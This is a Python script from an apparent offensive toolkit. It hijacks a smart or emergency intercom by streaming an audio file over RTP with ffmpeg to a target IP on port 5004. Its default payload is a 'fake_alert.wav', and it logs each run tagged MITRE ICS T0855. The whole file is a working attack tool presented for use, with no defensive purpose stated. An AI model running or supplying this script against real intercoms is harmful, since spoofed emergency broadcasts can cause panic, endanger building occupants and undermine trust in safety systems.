#!/usr/bin/env python3
# modules/attacks/emergency_intercom_hijacker.py

import os
import argparse
import time
import subprocess
import json
from datetime import datetime

LOG_FILE = "results/intercom_hijack_log.json"
MITRE_TTP = "T0855"

def log_action(target_ip, action):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": target_ip,
        "action": action,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def hijack_intercom(target_ip, audio_file):
    try:
        subprocess.run([
            "ffmpeg", "-re", "-i", audio_file,
            "-f", "rtp", f"rtp://{target_ip}:5004"
        ], check=True)
        log_action(target_ip, f"Played {audio_file}")
        print(f"[✓] Broadcasted spoofed audio to intercom at {target_ip}")
    except Exception as e:
        print(f"[!] Broadcast failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Hijack smart intercom via RTP audio stream")
    parser.add_argument("--ip", required=True, help="Target intercom IP")
    parser.add_argument("--audio", default="payloads/fake_alert.wav", help="WAV audio file to play")
    args = parser.parse_args()
    hijack_intercom(args.ip, args.audio)
